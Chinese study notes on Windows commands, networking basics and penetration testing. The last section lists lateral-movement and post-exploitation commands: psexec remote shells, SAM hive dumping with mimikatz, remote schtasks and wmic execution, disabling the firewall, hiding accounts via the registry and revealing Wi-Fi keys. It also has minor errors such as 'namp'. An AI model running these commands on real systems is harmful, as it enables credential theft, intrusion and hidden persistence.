# 1.概述
## ①虚拟化技术  
寄生架构 | 原生架构

## ②格式化类型  
**ntfs**:文件系统可以存储几乎无限制的文件大小  
**fat**:文件系统最大文件大小为4GB 

## ③子网掩码  
1个IP地址必须配1个子网掩码  
子网掩码分类：  
- A类：`1.0.0.0~126.0.0.0` 默认子网掩码`255.0.0.0`  
保留私有地址:`10.0.0.0～10.255.255.255`   
- B类：`128.0.0.0~191.255.255.255` 默认子网掩码`255.255.0.0`  
保留私有地址:`172.16.0.0～172.31.255.255`  
- C类：`192.0.0.0~223.255.255.255` 默认子网掩码`255.255.255.0`  
保留私有地址:`192.168.0.0～192.168.255.255`  
- D类：`224~239` 组播地址  
- E类：`240~255` 科研使用  
主机位全为`0`：网段地址，主机位全为`255`：广播地址  
`127.0.0.1` 本地回环地址  

## ④网关  
一个网络的出口，Gateway=GW,一般网关在路由器上  
网关IP一般是第一个`10.1.1.1`或最后一个`10.1.1.254`

# 2.DNS(Domain Name Service)
`ipconfig` 查看IP信息  
`ipconfig /all` 查看IP详细信息  
`ping [ip]`  
`ping -t [ip]` 一直ping  
`ping -n [num] [ip]` 指定ping几个包  
`ping -l [size] [ip]` 指定ping包大小  
手动解析域名：`nslookup www.jd.com`  

# 3.Windows文件处理
## 浏览文件：
`type [文件名.扩展名] | more`  分页显示  
`dir c:\windows | more`  
`dir /a`  浏览所有文件  
`dir /s`  显示指定目录和所有子目录中的文件  
`dir /b`  使用空格式(没有标题信息或摘要)  

## 创建文件：
`echo "xxx" > [文件名.扩展名]`  一行  
`echo "xxx" >> [文件名.扩展名]`  追加  
`copy con [文件名.扩展名]`  多行  
`md [目录名]`  创建文件夹  

## 删除文件：
`del [文件名.扩展名]`  
`del *.txt`  删除所有该类型文件  
`del *.*`  删除所有文件  
`rd [文件名]`  删除文件夹  
`rd [文件名] /s` 删除指定目录和所有子目录及其包含的所有件  

## 修改文件属性：
`attrib +h [文件名]`  对文件添加属性  
*+h:隐藏; -h:取消隐藏; +s:将文件夹提升为受保护的系统级*

## 复制/移动文件：
`copy [文件名.扩展名] [目标路径]`  
`move [文件名.扩展名] [目标路径]`  
`xcopy [目录] [目标路径] /e` 拷贝文件夹  

## 重命名：
`ren [旧名] [新名]`

## 快速生成指定大小字节的空文件：
`fsutil file createnew d:\system.ini 409600000`

## 修改关联性：
`assoc .txt=exefile`  将.txt文件修改为可执行程序

## 系统定时关机：
`shutdown -s -t 60 -c "xxx"`  
*-s:关机; -r:重启; -t:指定时间; -f:强制; -c:注释*  
`shutdown -a`  取消一切定时

# 4.批处理 .bat
`@echo off`  关闭回显  
`pause`  暂停  
`echo.`  空一行  
`\>nul`  屏蔽输出  
`2>nul`  屏蔽输出与报错  
`:1`  标签名  
`goto 1`  跳转到指定标签  
`%userprofile% ` 用户文件夹  
`set a=100`  定义变量a  
`%a%`  使用变量a  
`set /p a=`  变量a来自输入  
`taskkill /f /im explorer.exe`  关闭资源管理器进程  
`start c:\windows\explorer.exe`  开启资源管理器  

# 5.用户与组管理
## ①用户管理  

每个账户有唯一的SID，windows管理员uid`500`，普通用户uid从`1000`开始  
账户密码存储位置：c:\windows\system32\config\SAM  

### 内置账户:  
#### 可用账户:  
`administrator`  管理员账户  
`guest`  来宾账户  
#### 计算机服务组件相关的系统账号:  
`system`  系统账户  
`local services`  本地服务账户  
`network services`  网络服务账户  
### 用户管理指令:  
`net user` 查看用户列表  
`net user [用户名] [密码]`  改密码  
`net user [用户名] [密码] /add`  创建新用户  
`net user [用户名] /del`  删除用户  
`net user [用户名] /active:yes/no`  激活或禁用账户  

## ②组管理  

简化权限的赋予  
### 内置组:  
内置组的权限默认已经被系统赋予  
`administrators`  管理员组  
`guests`  来宾组  
`users`  普通用户组  
`network`  网络配置组  
`print`  打印机组  
`remote desktop`  远程桌面组  
### 组管理指令:  
`net localgroup` 查看组  
`net localgroup [组] [用户] /add`  将用户加入组  
`net localgroup [组] [用户] /del`  将用户移除组  
`net localgroup [组名] /add`  创建组  

# 6.渗透测试
1. 信息收集  
`nslookup`(Windows)  
`whois`(Linux/Unix)
2. 扫描漏洞  
namp  
高级扫描：如IIS漏洞，网站漏洞  
3. 漏洞利用  
4. 提权(shell环境、桌面环境)  
5. 擦除痕迹  
6. 留后门  

- ## Nmap:
`-sn  10.1.1.1/24` 扫描整个网段  
`-p 21,23-25,3389` 指定端口范围  
`-F` 扫描常用端口  
`-sV` 服务版本探测  
`-O 10.1.1.1` 操作系统探测  
`-A 10.1.1.1` 全面扫描  
`-oN d:\result.txt` 保存txt  

- ## IPC$,445:  
`net use \\[ip]\ipc$ [密码] /user:[用户]` 创建ipc$连接  
`net use z: \\[ip]\c$ [密码] /user:[用户]` c$映射到z:  
`net use z: /del` 删除连接   
`net use * /del` 删除所有连接   
`net share ipc$` 创建ipc$  
`net share ipc$ /del` 删除ipc$  
`net share [共享名称]=[路径] /grant:administrator,full` 创建共享目录，设置用户访问权限  
`./psexec.exe \\[ip] -u [username] -p [password] -i cmd` psexec远程获取shell  `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken` 筛选管理员令牌

- ## SAM破解密码:  
`reg save hklm\sam sam.hive` 抓取SAM文件  
`reg save hklm\system system.hive` 抓取SYSTEM文件  
将sam.hive和system.hive文件放在mimikatz.exe同一目录下  
`mimikatz.exe lsadump::sam /sam:sam.hive /system:system.hive`  得到hash值  

- ## schtasks定时任务:
需开启防火墙“远程计划任务管理”规则，和任意一个程序为"svchost.exe"且端口为"RPC终结点映射器"的规则

创建任务，只在用户登录时运行:  
`schtasks /create /s [ip] /u [username] /p [password] /tn [任务名] /tr [任务指令] /sc [执行频率] /f`

创建任务，与指定用户交互式运行:  
`schtasks /create /tn [任务名] /tr [任务指令] /sc [执行频率] /st [执行时间] /ru [username] /rp [password] /it /f`

创建任务，后台运行:  
`schtasks /create /s [ip] /u administrator /p [password] /tn [任务名] /tr [任务指令] /sc [执行频率]  /ru system /f`

立即运行任务:  
`schtasks /run /s [ip] /u administrator /p [password] /tn [任务名]`

- ## 注册表查询与修改:
查询所有用户的SID:  
`wmic useraccount get name,sid`

查询SID对应用户的环境变量:  
`reg query "HKU\[sid]\Environment"`

查询当前用户环境变量:  
`reg query "HKCU\Environment"`

查询系统环境变量:  
`reg query "HKLM\System\CurrentControlSet\Control\Session Manager\Environment"`

修改系统环境变量:  
`reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Environment" /v PATH /t REG_EXPAND_SZ /d "%PATH%;C:\new\path" /f`

登陆界面隐藏账户:  
`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v [username] /t REG_DWORD /d 0`

- ## wmic远程控制:
`netsh advfirewall set currentprofile state off` 关闭防火墙  
`netsh firewall set service RemoteAdmin enable` 开启远程管理  

远程创建进程:  
`wmic /node:[ip] /user:[用户名] /password:[密码] process call create "[指令]"`

查看文件夹共享:  
`wmic share list`

开启指定文件夹共享(只读权限):  
`wmic share call create "","","MaximumAllowed","Name","","Path",0`

删除指定共享文件夹:  
`wmic share where "name='[共享目录名称]'" delete`

查询进程:  
`wmic process list brief`

终止进程:  
`wmic process where processid="[pid]" delete`  
`wmic process where name="[processName]" delete`  
`taskkill /f /pid [pid]`

查看wlan密码:  
`netsh wlan show profile name="[网络名]" key=clear`
